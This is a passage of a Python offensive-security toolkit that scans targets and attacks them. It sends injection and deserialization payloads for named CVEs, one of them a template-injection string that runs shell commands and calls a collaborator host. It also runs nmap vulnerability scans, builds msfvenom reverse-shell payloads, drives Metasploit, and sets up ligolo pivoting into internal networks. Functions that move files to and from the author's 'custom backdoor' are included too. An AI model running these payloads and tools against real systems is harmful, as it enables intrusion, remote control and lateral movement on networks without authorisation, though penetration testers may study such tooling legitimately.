        "Content-Type": "application/json"
    }
    payload = {
        "email": f"\"http://{collaborator}/{{''.__class__.mro()[2].__subclasses__()[185]('{test_command}',shell=True,stdout=-1).communicate()[0].strip()}}\"",
        "productName": "ga_term"
    }
    try:
        response = requests.post(url, headers=headers, json=payload, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def send_initial_request_decisionsfilewrite(domain):
    url = f"{domain}/decisions/Primary/API/FileReferenceService/xml/WriteFile"
    headers = {
        "Host": domain.split("//")[-1],
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Dnt": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Connection": "keep-alive"
    }
    try:
        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def get_key_logi(domain):
    url = f"{domain}/logi/rdTemplate/rdGetSecureKey.aspx?Username=test"
    headers = {
        "Host": domain.split("//")[-1],
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Dnt": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Connection": "keep-alive"
    }
    try:
        response = requests.get(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def send_initial_request_cve_2020_7961(domain):
    url = f"{domain}/group/control_panel/..%3b/..%3b/api/jsonws/expandocolumn/add-column/-p_auth/-tableId/-name/-type/-defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource/"
    headers = {
        "Host": domain.split("//")[-1],
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "4443"
    }
    try:
        response = requests.post(url, headers=headers, verify=False, allow_redirects=False, timeout=2)
        return response
    except Timeout:
        return None

def check_ports_all(domain, hostname):
    print(" ")
    print("[+] Checking All Ports, This Will Take 2 Minutes...")
    print(" ")
    open_ports = []
    closed_ports = []

    def check_and_record(port):
        if check_port(domain.split("//")[-1], port):
            return (port, True)
        else:
            return (port, False)

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_and_record, port): port for port in range(1, 65536)}

        for future in concurrent.futures.as_completed(futures):
            try:
                port, is_open = future.result()
                if is_open:
                    open_ports.append(port)
                else:
                    closed_ports.append(port)
            except Exception as e:
                color = "\033[93m"
                reset_color = "\033[0m"
                print(f"{color}[-] An error occurred: {e}{reset_color}")

    # Convert the list of open ports to a comma-separated string
    open_ports_str = ','.join(map(str, open_ports))

    try:
        print(" ")
        print("[+] Initiating Nmap Vulners Scan...")
        print(" ")
        command = f"nmap -p {open_ports_str} -sV -T3 --min-rate=750 --script vuln {hostname}"
        print(f"{command}")
        subprocess.call(command, shell=True)
    except KeyboardInterrupt:
        print("[-] KeyboardInterrupt detected. Moving on..")
        print(" ")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

    return open_ports_str

def check_port(domain, port):
    """ Check if a specific port is open on the given domain """
    try:
        with socket.create_connection((domain, port), timeout=0.1):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def check_smb_ports(domain):
    smb_ports = {
        20: "FTP Data Transfer",
        21: "FTP Control",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        67: "DHCP Server",
        68: "DHCP Client",
        69: "TFTP",
        80: "HTTP",
        110: "POP3",
        119: "NNTP",
        123: "NTP",
        135: "Microsoft RPC",
        137: "NetBIOS Name Service",
        138: "NetBIOS Datagram Service",
        139: "NetBIOS Session Service",
        143: "IMAP",
        161: "SNMP",
        194: "IRC",
        389: "LDAP",
        443: "HTTPS",
        445: "SMB over TCP",
        465: "SMTPS",
        514: "Syslog",
        520: "RIP",
        587: "SMTP (submission)",
        636: "LDAP over SSL",
        873: "rsync",
        993: "IMAPS",
        995: "POP3S",
        1080: "SOCKS Proxy",
        1194: "OpenVPN",
        1433: "Microsoft SQL Server",
        1521: "Oracle Database",
        1723: "PPTP",
        2049: "NFS",
        2082: "cPanel",
        2083: "cPanel over SSL",
        3128: "Squid Proxy",
        3306: "MySQL Server",
        3389: "RDP",
        3690: "Subversion",
        5432: "PostgreSQL Server",
        5900: "VNC",
        5985: "WinRM (HTTP)",
        5986: "WinRM (HTTPS)",
        6379: "Redis",
        6667: "IRC (common alternative)",
        8080: "HTTP Proxy",
        8443: "HTTPS (alternative)",
        9000: "SonarQube",
        9092: "Kafka",
        10000: "Webmin",
        27017: "MongoDB",
        50000: "SAP",
    }

    open_ports = []
    closed_ports = []

    def check_and_record(port, description):
        if check_port(domain.split("//")[-1], port):
            return (port, description, True)
        else:
            return (port, description, False)

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_and_record, port, description): port for port, description in smb_ports.items()}

        for future in concurrent.futures.as_completed(futures):
            try:
                port, description, is_open = future.result()
                if is_open:
                    open_ports.append((port, description))
                else:
                    closed_ports.append((port, description))
            except Exception as e:
                color = "\033[93m"
                reset_color = "\033[0m"
                print(f"{color}[-] An error occurred: {e}{reset_color}")

    return open_ports, closed_ports

def check_cve(domain):
    cves = [
        ("CVE-2015-4670", send_initial_request_cve_2015_4670),
        ("CVE-2021-34427", send_initial_request_cve_2021_34427),
        ("CVE-2022-21445", send_initial_request_cve_2022_21445),
        ("CVE-2022-41326", send_initial_request_cve_2022_41326),
        ("CVE-2023-0100", send_initial_request_cve_2023_0100),
        ("CVE-2023-35813", send_initial_request_cve_2023_35813),
        ("CVE-2024-32651", send_initial_request_cve_2024_32651),
        ("CVE-2020-7961", send_initial_request_cve_2020_7961),
        ("Decisions File Write", send_initial_request_decisionsfilewrite),
        ("Logi Open Secure Key", get_key_logi),
    ]

    for cve_name, request_function in cves:
        response = request_function(domain)
        reset_color = "\033[0m"
        if response is None:
            print(f"[-] Timeout occured for {domain} with {cve_name}.")
            continue

        status_code = response.status_code

        if response.status_code == 200:
            color = "\033[92m"
            print(f"{color}[+] {domain} appears VULNERABLE to {cve_name} with {response.status_code} response.{reset_color}")
        elif response.status_code == 500 and cve_name in ["CVE-2022-21445", "CVE-2022-41326", "CVE-2020-7961"]:
            color = "\033[93m"
            print(f"{color}[+] {domain} appears VULNERABLE to {cve_name} with {response.status_code} response.{reset_color}")
        else:
            print(f"[-] {domain} is NOT vulnerable to {cve_name}: {response.status_code}.")

def check_cve_main(url_input):
    global globaltarget, globaltargetenabled, limitloop

    while True:
        while True:
            if not limitloop:
                if globaltargetenabled:
                    if target_is_url:
                        url = globaltarget
                        domain = globaltarget
                        hostname = urllib.parse.urlsplit(domain).hostname
                        limitloop = True
                        break
                    print("")
                    print("[-] this module requires the target to be a URL")
                    return
                if url_input:
                    url = url_input
                    if validators.url(url):
                        domain = url
                        hostname = urllib.parse.urlsplit(domain).hostname
                        limitloop = True
                        break  # Exit the loop if a valid URL is provided
                    print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
                    return
                else:
                    url = input_with_backspace("\nURL to check (Press enter to exit)> ")
                if not url:
                    return  # If the user presses Enter without entering a URL, exit the loop
                if validators.url(url):
                    domain = url
                    hostname = urllib.parse.urlsplit(domain).hostname
                    break  # Exit the loop if a valid URL is provided
                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
            print("")
            color = "\033[92m"
            reset_color = "\033[0m"
            print(f"{color}[+] completed{reset_color}")
            limitloop = False
            return

        cves = [
            ("CVE-2015-4670", send_initial_request_cve_2015_4670),
            ("CVE-2021-34427", send_initial_request_cve_2021_34427),
            ("CVE-2022-21445", send_initial_request_cve_2022_21445),
            ("CVE-2022-41326", send_initial_request_cve_2022_41326),
            ("CVE-2023-0100", send_initial_request_cve_2023_0100),
            ("CVE-2023-35813", send_initial_request_cve_2023_35813),
            ("CVE-2024-32651", send_initial_request_cve_2024_32651),
            ("CVE-2020-7961", send_initial_request_cve_2020_7961),
            ("Decisions File Write", send_initial_request_decisionsfilewrite),
            ("Logi Open Secure Key", get_key_logi),
        ]

        for cve_name, request_function in cves:
            response = request_function(domain)
            reset_color = "\033[0m"
            if response is None:
                print(f"[-] Timeout occured for {domain} with {cve_name}.")
                continue

            status_code = response.status_code

            if response.status_code == 200:
                color = "\033[92m"
                print(f"{color}[+] {domain} appears VULNERABLE to {cve_name} with {response.status_code} response.{reset_color}")
            elif response.status_code == 500 and cve_name in ["CVE-2022-21445", "CVE-2022-41326", "CVE-2020-7961"]:
                color = "\033[93m"
                print(f"{color}[+] {domain} appears VULNERABLE to {cve_name} with {response.status_code} response.{reset_color}")
            else:
                print(f"[-] {domain} is NOT vulnerable to {cve_name}: {response.status_code}.")

def checkall(url_input):
    global globaltarget, globaltargetenabled, limitloop

    while True:
        while True:
            if not limitloop:
                if globaltargetenabled:
                    if target_is_url:
                        url = globaltarget
                        domain = globaltarget
                        hostname = urllib.parse.urlsplit(domain).hostname
                        limitloop = True
                        break
                    print("")
                    print("[-] this module requires the target to be a URL")
                    return
                if url_input:
                    url = url_input
                    if validators.url(url):
                        domain = url
                        hostname = urllib.parse.urlsplit(domain).hostname
                        limitloop = True
                        break  # Exit the loop if a valid URL is provided
                    print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
                    return
                else:
                    url = input_with_backspace("\nURL to check (Press enter to exit)> ")
                if not url:
                    return  # If the user presses Enter without entering a URL, exit the loop
                if validators.url(url):
                    domain = url
                    hostname = urllib.parse.urlsplit(domain).hostname
                    break  # Exit the loop if a valid URL is provided
                print("[-] Invalid input. Please enter a valid URL (e.g., https://<domain>/).")
            print("")
            color = "\033[92m"
            reset_color = "\033[0m"
            print(f"{color}[+] completed{reset_color}")
            limitloop = False
            return

        try:
            print(" ")
            print("[+] Looking for Subdomains...")
            print(" ")
            capture_subdomains(domain, sublist3r_output_file)
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on...")
            print(" ")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

        try:
            print(" ")
            print("[+] Crawling...")
            print(" ")
            default_spider(domain)
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on...")
            print(" ")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

        try:
            print(" ")
            print("[+] Quickly Checking for Exploits...")
            print(" ")
            process_wordlist_check_cve(sublist3r_output_file, domain)
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on...")
            print(" ")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

        print(" ")
        print("[+] Checking for potentially vulnerable endpoints...")
        print(" ")
        def run_check(description, filename):
            try:
                print(f"\n[+] {description}")
                process_wordlist_check_endpoints(sublist3r_output_file, domain, filename)
                color = "\033[92m"
                reset_color = "\033[0m"
                print(f"{color}[+] completed{reset_color}")
                print(" ")
            except KeyboardInterrupt:
                print("[-] KeyboardInterrupt detected. Moving on...")
                print(" ")
            except Exception as e:
                print(f"[-] An error occurred: {e}")

        # List of descriptions and files to check
        checks = [
            ("Checking SQL Endpoints...", sql_endpoints_file),
            ("Checking LFI Endpoints...", lfi_endpoints_file),
            ("Checking Deserialization Endpoints...", deserialization_endpoints_file),
            ("Checking File Upload Endpoints...", upload_endpoints_file),
            ("Checking Misc Interesting Endpoints...", misc_vuln_endpoints),
            #("Checking Interesting Endpoints with Known Paths...", endpoints_with_paths),
        ]

        # Use ThreadPoolExecutor to manage threads
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(run_check, description, filename) for description, filename in checks]
        
            # Wait for all threads to complete
            for future in futures:
                future.result()

        try:
            # Check ports
            print("[+] Quickly Checking for Common Ports...")
            print(" ")
            open_ports, closed_ports = check_smb_ports(domain)
            color = "\033[92m"
            reset_color = "\033[0m"
            if open_ports:
                for port, description in open_ports:
                    print(f"{color}[+] Port {port} ({description}) is OPEN{reset_color}")
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on...")
            print(" ")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

        try:
            print(" ")
            check_ports_all(domain, hostname)
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on..")
            print(" ")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

        try:
            process_wordlist_nikto(sublist3r_output_file)
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on...")
            print(" ")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

        try:
            process_wordlist_ffuf(sublist3r_output_file)
        except KeyboardInterrupt:
            print("[-] KeyboardInterrupt detected. Moving on...")
            print(" ")
        except Exception as e:
            print(f"[-] An error occurred: {e}")

def generate_payload():
    global default_lhost, default_lport, default_payload
    
    # Payload options with default values for extension, format, platform, and architecture
    payload_options = {
        "windows/x64/meterpreter/reverse_tcp": {"extension": "exe", "format": "exe", "platform": "windows", "arch": "x64"},
        "windows/x64/meterpreter_reverse_tcp": {"extension": "exe", "format": "exe", "platform": "windows", "arch": "x64"},
        "windows/x64/shell/reverse_tcp": {"extension": "exe", "format": "exe", "platform": "windows", "arch": "x64"},
        "windows/x64/shell_reverse_tcp": {"extension": "exe", "format": "exe", "platform": "windows", "arch": "x64"},
        "linux/x64/meterpreter/reverse_tcp": {"extension": "elf", "format": "elf", "platform": "linux", "arch": "x64"},
        "linux/x64/shell_reverse_tcp": {"extension": "elf", "format": "elf", "platform": "linux", "arch": "x64"},
        "osx/x64/meterpreter/reverse_tcp": {"extension": "macho", "format": "macho", "platform": "osx", "arch": "x64"},
        "osx/x64/meterpreter_reverse_tcp": {"extension": "macho", "format": "macho", "platform": "osx", "arch": "x64"},
        "osx/x64/shell_reverse_tcp": {"extension": "macho", "format": "macho", "platform": "osx", "arch": "x64"},
        "php/meterpreter_reverse_tcp": {"extension": "php", "format": "raw", "platform": "php", "arch": "php"},
        "php/reverse_php": {"extension": "php", "format": "raw", "platform": "php", "arch": "php"},
        "java/jsp_shell_reverse_tcp": {"extension": "jsp", "format": "raw", "platform": "java", "arch": "java"},
        "java/shell_reverse_tcp": {"extension": "jsp", "format": "raw", "platform": "java", "arch": "java"},
        "android/meterpreter/reverse_tcp": {"extension": "apk", "format": "raw", "platform": "android", "arch": "dalvik"},
        "cmd/unix/reverse_python": {"extension": "py", "format": "raw", "platform": "unix", "arch": "cmd"},
        "cmd/unix/reverse_bash": {"extension": "sh", "format": "raw", "platform": "unix", "arch": "cmd"},
    }

    # Display a menu of payloads
    print("\nAvailable payloads:")
    for i, payload_name in enumerate(payload_options.keys(), start=1):
        print(f" {i}. {payload_name}")
            
    while True:
        payload_choice = input(f"\nSelect a payload (Press enter to exit)> ").strip()
        if not payload_choice:
            return
        elif payload_choice.isdigit() and 1 <= int(payload_choice) <= len(payload_options):
            payload = list(payload_options.keys())[int(payload_choice) - 1]
            break
        else:
            print("Invalid selection. Please choose a valid number.")

    # Prompt the user for input, allowing them to press Enter to keep the current value
    lhost = input(f"Enter a new LHOST ({default_lhost}): ").strip() or default_lhost
    lport = input(f"Enter a new LPORT ({default_lport}): ").strip() or default_lport
    template = input(f"Enter a template file path (optional, leave blank if not used): ").strip()

    # Get the default options based on the selected payload
    options = payload_options[payload]
    default_extension = options["extension"]
    default_format = options["format"]
    default_platform = options["platform"]
    default_arch = options["arch"]

    filename = input(f"Enter filename (default extension: .{default_extension}): ").strip()
    if not filename:
        filename = f"payload.{default_extension}"
    elif not os.path.splitext(filename)[1]:
        # If the user did not provide an extension, use the default
        filename += f".{default_extension}"

    # Prepend the directory path to the filename
    full_path = os.path.join(payloads_directory, filename)

    # Construct the msfvenom command
    msfvenom_command = [
        "msfvenom",
        "-p", payload,
        "LHOST={}".format(lhost),
        "LPORT={}".format(lport),
        "-f", default_format,
        "-o", full_path,
        "-e", default_encoder,
        "-i", str(default_iterations),
        "--platform", default_platform,
        "-a", default_arch
    ]
    if template:
        msfvenom_command.extend(["-x", template])
    
    # Execute the msfvenom command
    print(f"\nGenerating: {' '.join(msfvenom_command)}\n")
    result = subprocess.run(msfvenom_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Check if the payload was generated successfully
    if result.returncode == 0:
        print(f"[+] Payload generated successfully and saved to {filename}")
    else:
        print(f"[-] Failed to generate payload. {result.stderr}")

    generate_payload()

def send_metasploit_commands(master):

    commands = [
        f"set payload {default_payload}",
        f"set payloadfile {default_payloadfile}",
        f"set lport {default_lport}",
        f"set lhost {default_lhost}",
        f"set rhosts {default_rhosts}",
        f"set password_wordlist {default_password_wordlist}",
        f"set user_wordlist {default_user_wordlist}",
        f"set exploit_target {default_exploit_target}",
        f"set encoder {default_encoder}",
        f"set exit_on_session {default_exit_on_session}",
        f"set verbose {default_verbose}",
        f"set rport {default_rport}",
        f"set evasion {default_evasion}",
        f"set nop {default_nop}",
        f"set badchars {default_badchars}",
        f"set iterations {default_iterations}",
        f"set timeout {default_timeout}",
        f"set http_user_agent {default_http_user_agent}",
        f"set ssl {default_ssl}",
        # Add other parameters as needed
    ]

    for command in commands:
        # Extract the parameter name from the command
        param_name = command.split()[1]
        # Get the corresponding default value
        default_value = globals()[f"default_{param_name}"]
        # Skip empty values
        if not default_value:
            continue
        # Send the command to Metasploit
        os.write(master, f"{command}\n".encode())

# Function to load Metasploit parameters from a configuration file
def load_metasploit_params():
    global default_payload, default_payloadfile, default_lport, default_lhost, default_rhosts
    global default_password_wordlist, default_user_wordlist, default_exploit_target, default_encoder
    global default_exit_on_session, default_verbose, default_rport, default_evasion, default_nop
    global default_badchars, default_iterations, default_timeout, default_http_user_agent, default_ssl
    global default_setg, default_advanced_options

    try:
        config.read('metasploit_config.ini')
        default_payload = config.get('Metasploit', 'payload', fallback=default_payload)
        default_payloadfile = config.get('Metasploit', 'payloadfile', fallback=default_payloadfile)
        default_lport = config.get('Metasploit', 'lport', fallback=default_lport)
        default_lhost = config.get('Metasploit', 'lhost', fallback=default_lhost)
        default_rhosts = config.get('Metasploit', 'rhosts', fallback=default_rhosts)
        default_password_wordlist = config.get('Metasploit', 'password_wordlist', fallback=default_password_wordlist)
        default_user_wordlist = config.get('Metasploit', 'user_wordlist', fallback=default_user_wordlist)
        default_exploit_target = config.get('Metasploit', 'exploit_target', fallback=default_exploit_target)
        default_encoder = config.get('Metasploit', 'encoder', fallback=default_encoder)
        default_exit_on_session = config.getboolean('Metasploit', 'exit_on_session', fallback=default_exit_on_session)
        default_verbose = config.getboolean('Metasploit', 'verbose', fallback=default_verbose)
        default_rport = config.get('Metasploit', 'rport', fallback=default_rport)
        default_evasion = config.get('Metasploit', 'evasion', fallback=default_evasion)
        default_nop = config.get('Metasploit', 'nop', fallback=default_nop)
        default_badchars = config.get('Metasploit', 'badchars', fallback=default_badchars)
        default_iterations = config.getint('Metasploit', 'iterations', fallback=default_iterations)
        default_timeout = config.getint('Metasploit', 'timeout', fallback=default_timeout)
        default_http_user_agent = config.get('Metasploit', 'http_user_agent', fallback=default_http_user_agent)
        default_ssl = config.getboolean('Metasploit', 'ssl', fallback=default_ssl)
        color = "\033[92m"
        reset_color = "\033[0m"
        print(f"{color}[+] metasploit_config.ini loaded{reset_color}")
    except configparser.Error as e:
        print(f"Error loading configuration: {e}")
        
# Function to save Metasploit parameters to a configuration file
def save_metasploit_params():
    config['Metasploit'] = {
        'payload': default_payload,
        'payloadfile': default_payloadfile,
        'lport': default_lport,
        'lhost': default_lhost,
        'rhosts': default_rhosts,
        'password_wordlist': default_password_wordlist,
        'user_wordlist': default_user_wordlist,
        'exploit_target': default_exploit_target,
        'encoder': default_encoder,
        'exit_on_session': str(default_exit_on_session),
        'verbose': str(default_verbose),
        'rport': default_rport,
        'evasion': default_evasion,
        'nop': default_nop,
        'badchars': default_badchars,
        'iterations': str(default_iterations),
        'timeout': str(default_timeout),
        'http_user_agent': default_http_user_agent,
        'ssl': str(default_ssl),
    }

    with open('metasploit_config.ini', 'w') as configfile:
        config.write(configfile)
        
    print(f"[+] metasploit_config.ini saved")

# Function to print the current values of Metasploit parameters
def print_current_defaults():
    print("Current Metasploit Parameter Values:\n")
    print(f"default_payload: {default_payload}")
    print(f"default_payloadfile: {default_payloadfile}")
    print(f"default_lport: {default_lport}")
    print(f"default_lhost: {default_lhost}")
    print(f"default_rhosts: {default_rhosts}")
    print(f"default_password_wordlist: {default_password_wordlist}")
    print(f"default_user_wordlist: {default_user_wordlist}")
    print(f"default_exploit_target: {default_exploit_target}")
    print(f"default_encoder: {default_encoder}")
    print(f"default_exit_on_session: {default_exit_on_session}")
    print(f"default_verbose: {default_verbose}")
    print(f"default_rport: {default_rport}")
    print(f"default_evasion: {default_evasion}")
    print(f"default_nop: {default_nop}")
    print(f"default_badchars: {default_badchars}")
    print(f"default_iterations: {default_iterations}")
    print(f"default_timeout: {default_timeout}")
    print(f"default_http_user_agent: {default_http_user_agent}")
    print(f"default_ssl: {default_ssl}")

# Function to update Metasploit parameters with user input
def update_metasploit_params():

    global default_payload, default_payloadfile, default_lport, default_lhost, default_rhosts
    global default_password_wordlist, default_user_wordlist, default_exploit_target, default_encoder
    global default_exit_on_session, default_verbose, default_rport, default_evasion, default_nop
    global default_badchars, default_iterations, default_timeout, default_http_user_agent, default_ssl
    global default_setg, default_advanced_options

    # Define a dictionary to hold the default values
    default_values = {
        'payload': default_payload,
        'payloadfile': default_payloadfile,
        'lport': default_lport,
        'lhost': default_lhost,
        'rhosts': default_rhosts,
        'password_wordlist': default_password_wordlist,
        'user_wordlist': default_user_wordlist,
        'exploit_target': default_exploit_target,
        'encoder': default_encoder,
        'exit_on_session': default_exit_on_session,
        'verbose': default_verbose,
        'rport': default_rport,
        'evasion': default_evasion,
        'nop': default_nop,
        'badchars': default_badchars,
        'iterations': default_iterations,
        'timeout': default_timeout,
        'http_user_agent': default_http_user_agent,
        'ssl': default_ssl,
    }

    # Iterate through each parameter to update the values
    print()
    for param, value in default_values.items():
        user_input = input(f"Enter new value for {param} (default: {value}): ")
        if user_input:
            default_values[param] = user_input

    # Update the default values with the new values
    default_payload = default_values['payload']
    default_payloadfile = default_values['payloadfile']
    default_lport = default_values['lport']
    default_lhost = default_values['lhost']
    default_rhosts = default_values['rhosts']
    default_password_wordlist = default_values['password_wordlist']
    default_user_wordlist = default_values['user_wordlist']
    default_exploit_target = default_values['exploit_target']
    default_encoder = default_values['encoder']
    default_exit_on_session = default_values['exit_on_session']
    default_verbose = default_values['verbose']
    default_rport = default_values['rport']
    default_evasion = default_values['evasion']
    default_nop = default_values['nop']
    default_badchars = default_values['badchars']
    default_iterations = default_values['iterations']
    default_timeout = default_values['timeout']
    default_http_user_agent = default_values['http_user_agent']
    default_ssl = default_values['ssl']
    
    print()
    save_metasploit_params()

def route(master):

    # Check if the required agent file has been uploaded
    uploaded = input("Has the required agent file been uploaded? (y/N): ").strip().lower()
    if uploaded.lower() != 'y':
        print("[-] Please upload the required agent file before running this module.\n")
        return

    # Get the agent file name
    agent_file_name = ""
    while not agent_file_name:
        agent_file_name = input("Enter the agent file name: ").strip()
        print()
        if not agent_file_name:
            print("[-] The agent file name cannot be blank. Please enter a valid file name.\n")

    # Find an available port
    port = find_available_port()
            
    internal_network = ""
    while not internal_network:
        internal_network = input("Enter the internal network: ").strip()
        print()
        if not internal_network:
            print("[-] The internal network cannot be blank. Please enter a valid network.\n")
        elif not is_valid_network(internal_network):
            print("[-] Invalid network format. Must end in 0 and include the subnet mask.\n")
            internal_network = ""
    
    bash_command_1 = f"sudo ip tuntap add user $(whoami) mode tun ligolo"
    bash_command_2 = f"sudo ip link set ligolo up"
    bash_command_3 = f"sudo ip route add {internal_network} dev ligolo"
    
    first_command_sequence = f"{bash_command_1} && {bash_command_2} && {bash_command_3}"
    
    ligolo_command_1 = f"./proxy -selfcert -laddr 0.0.0.0:{port}"
    
    agent_command = f"{agent_file_name} -connect {default_lhost}:{port} -ignore-cert\n"
    
    try:
        subprocess.Popen(["bash", "-c", first_command_sequence])
        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f"{ligolo_command_1}; exec bash"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(3)
        # Instruct the user to execute the agent in the reverse shell
        os.write(master, agent_command.encode())
        time.sleep(2)
        os.write(master, f"background\n".encode())
        os.write(master, f"y\n".encode())
        
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occured {e}{reset_color}")
        
def find_available_port(start_port=9000, end_port=9999):
    for port in range(start_port, end_port + 1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.bind(('', port))  # Try to bind to the port
                return port  # If successful, return the port number
            except socket.error:
                continue  # If the port is in use, continue to the next port
    raise RuntimeError(f"No available ports in the range {start_port}-{end_port}")
    
def is_valid_network(network):
    parts = network.split('/')
    if len(parts) != 2:
        return False
    ip_part, mask_part = parts
    ip_parts = ip_part.split('.')
    
    # Ensure that the last octet of the IP address contains a "0" before the subnet mask
    if len(ip_parts) != 4 or not ip_parts[-1].startswith("0"):
        return False
    
    for part in ip_parts:
        try:
            num = int(part)
            if num < 0 or num > 255:
                return False
        except ValueError:
            return False
    
    try:
        mask = int(mask_part)
        if mask < 0 or mask > 32:
            return False
    except ValueError:
        return False
    
    return True

def send_file(filename): #this is for my custom backdoor so ignore if your not me
    try:
        # Device's IP address
        SERVER_HOST = "0.0.0.0"
        SERVER_PORT = 3334
        # Receive 4096 bytes each time
        SEPARATOR = "<SEPARATOR>"
        BUFFER_SIZE = 4096
        # Create the server socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)  # connection should be instant so 10 seconds is fine
        # Set the socket option to allow reusing the address
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind the socket to our local address
        s.bind((SERVER_HOST, SERVER_PORT))

        s.listen(5)
        # Accept connection if there is any
        client_socket, address = s.accept()

        # Check if the file exists
        if not os.path.isfile(filename):
            color = "\033[93m"
            reset_color = "\033[0m"
            print("{color}[-] File not found{reset_color}")
            return

        # Get the file size
        filesize = os.path.getsize(filename)
        client_socket.send(str(filesize).encode())

        # Start sending the file
        print(f"[+] Sending {filename} with filesize {filesize} via TCP port {SERVER_PORT}")
        with open(filename, "rb") as f:
            while True:
                # Read the bytes from the file
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    # File sending is done
                    break
                # Send the bytes to the server
                client_socket.sendall(bytes_read)
        color = "\033[92m"
        reset_color = "\033[0m"
        print(f"{color}[+] {filename} sent{reset_color}")
        # Close the socket
        client_socket.close()
        # Close the server socket
        s.close()
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}An error occurred: {str(e)}{reset_color}")

def receive_file(filename): #this is for my custom backdoor so ignore if your not me
    try:
        SERVER_HOST = "0.0.0.0"
        SERVER_PORT = 3334
        # Receive 4096 bytes each time
        SEPARATOR = "<SEPARATOR>"
        BUFFER_SIZE = 4096
        s = socket.socket()

        s.settimeout(10) #connection should be instant so 10 seconds is fine
        # Set the socket option to allow reusing the address
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind the socket to our local address
        s.bind((SERVER_HOST, SERVER_PORT))
        
        s.listen(5)
        # Accept connection if there is any
        client_socket, address = s.accept()

        # Receive the file size
        filesize_str = client_socket.recv(BUFFER_SIZE).decode('utf-8', 'ignore')
        try:
            filesize = int(filesize_str)
        except ValueError:
            raise ValueError("Invalid filesize or file not found")

        # Check if filesize is valid
        if filesize <= 0:
            raise ValueError("Invalid filesize or file not found")

        # Start receiving the file from the socket
        # and writing to the file stream
        print(f"[+] Receiving {filename} with filesize {filesize} via TCP port {SERVER_PORT}")
        with open(filename, "wb") as f:
            while True:
                # Read 1024 bytes from the socket (receive)
                bytes_read = client_socket.recv(BUFFER_SIZE)
                if not bytes_read:
                    # Nothing is received
                    # File transmitting is done
                    break
                # Write to the file the bytes we just received
                f.write(bytes_read)
        color = "\033[92m"
        reset_color = "\033[0m"
        print(f"{color}[+] {filename} received.{reset_color}")
        # Close the client socket
        client_socket.close()
        # Close the server socket
        s.close()
    except socket.timeout:
        print(f"[-] Connection timed out. Port for file receiving is set to {SERVER_PORT}")
    except ValueError as ve:
        print(f"[-] An error occurred: {ve}")
    except Exception as e:
        color = "\033[93m"
        reset_color = "\033[0m"
        print(f"{color}[-] An error occurred: {e}{reset_color}")

def fuzz(url_input):
    global globaltarget, globaltargetenabled, limitloop
    print("\n**USE BASH IF YOU WANT TO ENTER WHOLE FFUF COMMANDS**")
    
    try:
        while True:
            if not limitloop:
                if globaltargetenabled:
                    if target_is_url:
                        url = globaltarget
                        domain = globaltarget
                        hostname = urllib.parse.urlsplit(domain).hostname

                        command = f"ffuf -u {domain}/FUZZ -w {ffuf_default_wordlist} -c -mc all -fc 404,400  -D -e zip,aspx,vbhtml -recursion -t 50 -sf -ac"
                        print(f"\n{command}\n")
                        subprocess.call(command, shell=True)
